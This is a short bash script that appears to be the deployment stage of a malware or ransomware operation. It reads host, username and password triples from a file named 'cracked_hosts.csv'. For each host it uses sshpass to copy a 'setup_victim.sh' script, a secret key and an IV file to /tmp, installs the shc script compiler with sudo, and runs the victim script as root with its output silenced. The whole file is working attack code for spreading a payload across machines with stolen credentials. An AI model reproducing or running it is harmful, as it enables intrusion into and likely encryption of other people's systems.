#!/bin/bash

./generating_key.sh 

while IFS=, read -r HOST USERNAME PASSWORD; do
    echo "THIS IS HOST : $HOST" 
    sshpass -p $PASSWORD scp setup_victim.sh $USERNAME@$HOST:/tmp/ &>/dev/null
    sshpass -p "$PASSWORD" scp victim/secret.key $USERNAME@$HOST:/tmp/network.key
    sshpass -p "$PASSWORD" scp victim/iv.txt $USERNAME@$HOST:/tmp/iv.txt 
    sshpass -p "$PASSWORD" ssh $USERNAME@$HOST "echo '$PASSWORD' | sudo -S apt-get update &>/dev/null && sudo -S apt-get install shc -y &>/dev/null"
    sleep 3
    sshpass -p $PASSWORD ssh $USERNAME@$HOST "echo $PASSWORD | sudo -S bash /tmp/setup_victim.sh" &>/dev/null
done < cracked_hosts.csv


